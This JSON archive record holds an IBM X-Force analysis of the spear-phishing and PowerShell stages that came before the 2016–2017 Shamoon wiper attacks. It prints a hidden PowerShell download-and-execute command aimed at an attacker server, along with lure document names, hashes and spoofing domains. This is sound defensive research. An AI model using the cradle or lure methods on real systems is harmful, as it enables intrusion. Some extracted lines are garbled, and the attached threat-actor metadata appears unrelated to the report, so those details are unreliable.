{
    "id": "a93b577f-d996-428d-831f-c15b537d831e",
    "created_at": "2022-10-25T16:48:14.435785Z",
    "updated_at": "2025-03-27T02:05:55.655189Z",
    "deleted_at": null,
    "sha1_hash": "1997a46afb1d791a45ff71cce472b5c90b4631af",
    "title": "The Full Shamoon: How the Devastating Malware Was Inserted Into Networks",
    "authors": "",
    "file_creation_date": "2017-02-28T15:10:40Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 555816,
    "plain_text": "# The Full Shamoon: How the Devastating Malware Was Inserted Into Networks\n\n**[February 15, 2017 | By Kevin Albano Co-authored by Limor Kessem](https://securityintelligence.com/author/kevin-albano/)**\n\n**_Authored by the IBM X-Force Incident Response and Intelligence Services (IRIS) team._**\n\n\n**[iStock](http://www.istockphoto.com/il/photo/oil-and-gas-refinery-plant-under-a-large-full-moon-gm533442192-94483977)**\n\n\n**Researchers from the IBM X-Force Incident Response and Intelligence Services (IRIS) team identified a missing link in the operations of a threat�**\n\n**actor involved in** **[recent Shamoon malware attacks against Gulf state organizations. These attacks, which occurred in November 2016 and](http://www.reuters.com/article/us-saudi-cyber-idUSKBN1571ZR)**\n\n**[January 2017, reportedly affected thousands of computers across multiple government and civil organizations in �Saudi Arabia and elsewhere in](https://www.infosecurity-magazine.com/news/saudi-arabia-issues-shamoon-2-alert/)**\n\n**[Gulf states. Shamoon is designed to destroy computer hard drives by wiping the master boot record (MBR) and data irretrievably, unlike](http://www.reuters.com/article/us-cyber-saudi-shamoon-idUSKBN13Q38B)**\n\n**ransomware, which holds the data hostage for a fee.**\n\n**Through their recent investigations, our forensics analysts pinpointed the initial compromise vector and post-compromise operations that led to**\n\n**the deployment of the destructive Shamoon malware on targeted infrastructures. It’s worth mentioning that, according to** **[X-Force IRIS, the](http://www.ibm.com/security/services/xforce-incident-response-and-intelligence.html?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)**\n\n**initial compromise took place weeks before the actual Shamoon deployment and activation were launched.**\n\n### Shamoon Attacks Preceded by Malicious Macros and PowerShell Commands\n\n**Since Shamoon incidents feature the infiltration and escalation stages of targeted attacks, X-Force IRIS responders sought out the attackers’�**\n\n**entry point. Their findings pointed to what appears to be the initial point of compromise the attackers used: a document containing a malicious�**\n\n**macro that, when approved to execute, enabled C2 communications to the attacker’s server and remote shell via PowerShell.**\n\n**The document was not the only one discovered in the recent attack waves. X-Force IRIS researchers had been tracking earlier activity**\n\n**associated with similar malicious, PowerShell-laden documents themed as resumes and human resources documents, some of which related**\n\n**to organizations in Saudi Arabia. This research identified several bouts of offensive activity that occurred in the past few months, which revealed�**\n\n**similar operational methods in which the attackers served malicious documents and other malware executables from web servers to their**\n\n**targets to establish an initial foothold in the network.**\n\n**[READ THE WHITE PAPER: DEALING WITH A DATA BREACH — BEFORE, DURING AND AFTER](https://www-01.ibm.com/marketing/iwm/dre/signup?source=mrs-form-12770&S_PKG=ov56871 &ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)**\n\n### Initial Compromise Vector Previously Unclear\n\n\n-----\n\n**remained unclear in the reported cases. X Force IRIS researchers studied Shamoon s attack life cycle and observed its tactics at Saudi based**\n\n**organizations and private sector companies. This research led them to believe that the actor using Shamoon in recent attacks relied heavily on**\n\n**weaponized documents built to leverage PowerShell to establish their initial network foothold and subsequent operations:**\n\n**1. Attackers send a spear phishing email to employees at the target organization. The email contains a Microsoft Office document as an�**\n\n**attachment.**\n\n**2. Opening the attachment from the email invokes PowerShell and enables command line access to the compromised machine.**\n\n**3. Attackers can now communicate with the compromised machine and remotely execute commands on it.**\n\n**4. The attackers use their access to deploy additional tools and malware to other endpoints or escalate privileges in the network.**\n\n**5. Attackers study the network by connecting to additional systems and locating critical servers.**\n\n**6. The attackers deploy the Shamoon malware.**\n\n**7. A coordinated Shamoon outbreak begins and computer hard drives across the organization are permanently wiped.**\n\n**_Figure 1: Shamoon Attack — Logical Flow of Events_**\n\n### A Phish Is Speared\n\n**[X-Force IRIS identified the below malicious document:�](https://securityintelligence.com/ibm-x-force-iris-bringing-a-new-approach-to-incident-response/)**\n\n**Detail** **Info**\n\n**File name** **cv_itworx.doc**\n\n**MD5** **45b0e5a457222455384713905f886bd4**\n\n**SHA256** **528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62**\n\n\n**Hosting**\n**URL**\n\n**Embedded**\n**PowerShell**\n\n\n**hxxp://mol.com-ho[.]me/cv_itworx.doc**\n\n**PowerShell.exe -window hidden -e**\n**cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQB3ACAAaABpAGQAZABlAG4AIAAtAG4AbwBuAGkAIAAtAG4AbwBw**\n\n\n**Decode** **PowerShell.exe -w hidden -noni -nop -c “iex(New-Object System.Net.WebClient).DownloadString(‘hxxp://139.59.46.154:3485/e**\n\n**Our researchers examined the domain that hosted the first malicious file, mol.com-ho[.]me. Per the domain’s WHOIS record, an anonymized�**\n\n\n-----\n\n**File Name** **File MD5**\n\n**cv.doc** **f4d18316e367a80e1005f38445421b1f**\n\n**cv_itworx.doc** **45b0e5a457222455384713905f886bd4**\n\n**cv_mci.doc** **f4d18316e367a80e1005f38445421b1f**\n\n**discount_voucher_codes.xlsm** **19cea065aa033f5bcfa94a583ae59c08**\n\n**Health_insurance_plan.doc** **ecfc0275c7a73a9c7775130ebca45b74**\n\n**Health_insurance_registration.doc** **1b5e33e5a244d2d67d7a09c4ccf16e56**\n\n**job_titles.doc** **fa72c068361c05da65bf2117db76aaa8**\n\n**job_titles_itworx.doc** **43fad2d62bc23ffdc6d301571135222c�**\n\n**job_titles_mci.doc** **ce25f1597836c28cf415394fb350ae93**\n\n**Password_Policy.xlsm** **03ea9457bf71d51d8109e737158be888**\n\n**These files were most likely delivered via spear phishing emails to lure employees into unwittingly launching the malicious payload.�**\n\n**A closer review of the file names revealed “IT Worx” and “MCI.” A search of the name IT Worx brings up a global software professional services�**\n\n**organization headquartered in Egypt. MCI is Saudi Arabia’s Ministry of Commerce and Investment. It is possible these names were used in**\n\n**spear phishing emails because they would seem benign to Saudi-based employees and lure them to open the attachment.**\n\n**X-Force IRIS researchers further identified that the threat actor behind the malicious documents served many of them using a URL-shortening�**\n\n**scheme in the following pattern: briefl[.]ink/{a-z0-9}[5].�**\n\n**File Detail** **Info**\n\n**File name** **job_titles_itworx.doc**\n\n**MD5** **43fad2d62bc23ffdc6d301571135222c�**\n\n**SHA256** **e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6**\n\n**Hosting URL** **hxxp://briefl.ink/qhtma�**\n\n**The following figure is a visual example of what employees may have encountered when they opened the malicious Word files sent to them in�**\n\n**preparation for a Shamoon attack:**\n\n|cv.doc|f4d18316e367a80e1005f38445421b1f|\n|---|---|\n|cv_itworx.doc|45b0e5a457222455384713905f886bd4|\n|cv_mci.doc|f4d18316e367a80e1005f38445421b1f|\n|discount_voucher_codes.xlsm|19cea065aa033f5bcfa94a583ae59c08|\n|Health_insurance_plan.doc|ecfc0275c7a73a9c7775130ebca45b74|\n|Health_insurance_registration.doc|1b5e33e5a244d2d67d7a09c4ccf16e56|\n|job_titles.doc|fa72c068361c05da65bf2117db76aaa8|\n|job_titles_itworx.doc|43fad2d62bc23ffdc6d301571135222c�|\n|job_titles_mci.doc|ce25f1597836c28cf415394fb350ae93|\n|Password_Policy.xlsm|03ea9457bf71d51d8109e737158be888|\n\n|File Detail|Info|\n|---|---|\n|File name|job_titles_itworx.doc|\n|MD5|43fad2d62bc23ffdc6d301571135222c�|\n|SHA256|e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6|\n|Hosting URL|hxxp://briefl.ink/qhtma�|\n\n\n-----\n\n**_Figure 2: Malicious Word Document Delivered in Preparation of a Shamoon Malware Attack (Source: X-Force IRIS)_**\n\n**Passive DNS results on a communications domain associated with the Shamoon attack revealed related network infrastructure, identifying**\n\n**additional domains used by the threat actors.**\n\n**Domain Name** **Spoofed Site**\n\n**ntg-sa[.]com** **The domain ntg-sa[.]com appears to spoof the legit domain ntg.sa.com associated with the Namer**\n**Trading Group. Per their webpage, NTG “was established primarily to cater the growing demands of**\n**Petrochemicals waste management within the Kingdom of Saudi Arabia.”**\n\n**maps-modon[.]club** **The maps-modon[.]club domain appears to spoof** **maps.modon.gov.sa, which is associated with the**\n**Saudi Industrial Property Authority, an organization “responsible for the development of industrial cities**\n**with integrated infrastructure and services.”**\n\n**X-Force IRIS discovered that the threat actor was hosting at least one malicious executable on a server hosted on ntg-sa[.]com. This file duped�**\n\n**targets into believing it was a Flash player installer that would drop a Windows batch to invoke PowerShell into the same C2 communications.**\n\n### Breakdown of the PowerShell-Related Macro\n\n**Analysis of one of the threat actor’s documents found that if the macro executes, it launches two separate PowerShell Scripts. The first one�**\n\n**executes a PowerShell script served from hxxp://139.59.46.154:3485/eiloShaegae1. The host is possibly related to attacks that served the**\n\n**[Pupy RAT, a publicly available cross-platform remote access tool.](https://github.com/n1nj4sec/pupy)**\n\n|Domain Name|Spoofed Site|\n|---|---|\n|ntg-sa[.]com|The domain ntg-sa[.]com appears to spoof the legit domain ntg.sa.com associated with the Namer Trading Group. Per their webpage, NTG “was established primarily to cater the growing demands of Petrochemicals waste management within the Kingdom of Saudi Arabia.”|\n|maps-modon[.]club|The maps-modon[.]club domain appears to spoof maps.modon.gov.sa, which is associated with the Saudi Industrial Property Authority, an organization “responsible for the development of industrial cities with integrated infrastructure and services.”|\n\n\n-----\n\n**p** **y** **g** **g** **g**\n\n**loop so the XOR continues 0x57 times.**\n\n**If this execution is successful, it creates a buffer using VirtualAlloc and calls InternetReadFile in a loop until all the file contents are retrieved�**\n\n**from hxxp://45.76.128.165:4443/0w0O6. This is then returned as a string to PowerShell, which calls invoke-expression (iex) on it, indicating that**\n\n**the expected payload is PowerShell.**\n\n**Of note, the macro contained a DownloadFile() function that would use URLDownloadToFileA, but this was never actually used.**\n\n**Based on observations associated with the malicious document, we observed subsequent shell sessions probably associated with Metasploit’s**\n\n**[Meterpreter that enabled deployment of additional tools and malware preceding deployment of three Shamoon-related files: ntertmgr32.exe,�](https://www.offensive-security.com/metasploit-unleashed /meterpreter-basics/)**\n\n**ntertmgr64.exe and vdsk911.sys.**\n\n### Shamoon’s Back, But for How Long This Time?\n\n**[Although the complete list of Shamoon’s victims is not public, Bloomberg reported that in one case, thousands of computers were destroyed at](https://www.bloomberg.com/news/articles/2016-12-01/destructive-hacks-strike-saudi-arabia-posing-challenge-to-trump)**\n\n**the headquarters of Saudi’s General Authority of Civil Aviation, erasing critical data and bringing operations to a halt for several days.**\n\n**The recent activity X-Force IRIS is seeing from the Shamoon attackers has so far been detected in two waves, but those are likely to subside**\n\n**following the public attention the cases have garnered since late 2016.**\n\n**[Saudi Arabia released a warning to local organizations about the Shamoon malware, alerting about potential attacks and advising organizations](http://www.reuters.com/article/us-saudi-cyber-idUSKBN1571ZR)**\n\n**to prepare. Analysis and warnings about Shamoon are resulting in preparation on the targets’ end, and actors are likely to disappear and**\n\n**change their tactics until the next wave of attacks.**\n\n\n-----\n\n**_[For technical details on this research and related indicators of compromise, see the X-Force Advisory on X-Force Exchange.](https://exchange.xforce.ibmcloud.com/collection/Spear-Phishing-Attacks-Preceding-Shamoon-Malware-Breakouts-eeed4eede51b9a4587f4c7c816ad6e4e)_**\n\n**Tags:** **[Advanced Malware |](https://securityintelligence.com/tag/advanced-malware/)** **[IBM X-Force Research |](https://securityintelligence.com/tag/ibm-x-force-research/)** **[Malware |](https://securityintelligence.com/tag/malware/)** **[Network Protection |](https://securityintelligence.com/tag/network-protection/)** **[Network Security |](https://securityintelligence.com/tag/network-security/)** **[X-Force](https://securityintelligence.com/tag/x-force-2/)**\n\n\n-----\n\n**Upcoming Webinar**\n\n\n#### Orchestrating Your Incident Response Strategy with IBM X-Force IRIS\n\n**March 10, 2017 @ 11:00 AM — 12:00 PM EST**\n\n\n**Featured Article**\n\n\n-----\n\n**CONTRIBUTORS**\n\n**[BECOME A CONTRIBUTOR](https://securityintelligence.com/become-a-contributor/)**\n\n\n**© 2017** **[IBM](http://www.ibm.com?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)** **[| Contact](http://www.ibm.com/contact/us/en/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US&ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)** **[| Privacy](http://www.ibm.com/privacy/us/en/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US&ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)** **[| Terms Of Use](http://www.ibm.com/legal/us/en/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US&ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)** **[| Accessibility](http://www.ibm.com/accessibility/us/en/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US&ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.02.15.the-full-shamoon/the-full-shamoon-how-the-devastating-malware-was-inserted-into-networks.pdf"
    ],
    "report_names": [
        "the-full-shamoon-how-the-devastating-malware-was-inserted-into-networks"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041155,
    "ts_creation_date": 1488294640,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/1997a46afb1d791a45ff71cce472b5c90b4631af.pdf",
        "text": "https://archive.orkl.eu/1997a46afb1d791a45ff71cce472b5c90b4631af.txt",
        "img": "https://archive.orkl.eu/1997a46afb1d791a45ff71cce472b5c90b4631af.jpg"
    }
}